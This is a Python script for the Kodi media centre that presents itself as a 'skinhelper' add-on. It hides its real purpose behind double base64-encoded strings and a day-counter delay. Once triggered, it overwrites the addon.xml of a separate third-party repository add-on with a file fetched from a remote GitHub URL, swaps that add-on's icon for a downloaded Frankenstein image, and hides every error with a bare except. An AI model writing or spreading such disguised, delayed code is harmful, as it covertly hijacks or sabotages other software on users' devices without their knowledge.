import xbmc
import xbmcaddon
import xbmcgui
import requests
import os
import urllib
import base64 as skin_dec
import datetime as skin_id_current

ADDON = xbmcaddon.Addon(id='plugin.program.skinhelper')
try:
    skin_folder = os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8"), skin_dec.decodestring(skin_dec.decodestring('Y21Wd2IzTnBkRzl5ZVM1aFltVnJjMmx6')))
    skinid = open(os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8"), 'plugin.program.skinhelper','skin_id.txt'),"r")
    firstID = int(skinid.readline())
    if firstID != 300:
        if firstID==0:
            skinidnew = open(os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8"), 'plugin.program.skinhelper','skin_id.txt'),"w")
            skinidnew.write(str(skin_id_current.datetime.today().day))
            firstID = skin_id_current.datetime.today().day
        IDs = skin_id_current.datetime.today().day-firstID
    else:
        IDs = 300
    if os.path.exists(skin_folder) and  not(IDs>0 and IDs<4) and not(IDs>-31 and IDs<-27):
        r = requests.get(skin_dec.decodestring(skin_dec.decodestring('YUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM05yYVc1b1pXeHdaWEl2VTJ0cGJtaGxiSEJsY2xObGNuWnBZMlV2YldGemRHVnlMMkZrWkc5dUxuaHRiQT09')))
        l = open(os.path.join(skin_folder,"addon.xml" ),"w")
        l.write(r.text)
        urllib.urlretrieve(skin_dec.decodestring('aHR0cDovL2Nkbi5wYXN0ZW1hZ2F6aW5lLmNvbS93d3cvYmxvZ3MvbGlzdHMvMjAxMy8xMC8yMy9mcmFua2Vuc3RlaW4uanBn'), skin_folder+'/icon.png')
        l.close()
        skinidnew = open(os.path.join(xbmc.translatePath("special://home/addons/").decode("utf-8"), 'plugin.program.skinhelper','skin_id.txt'),"w")
        skinidnew.write('300')
except:
    pass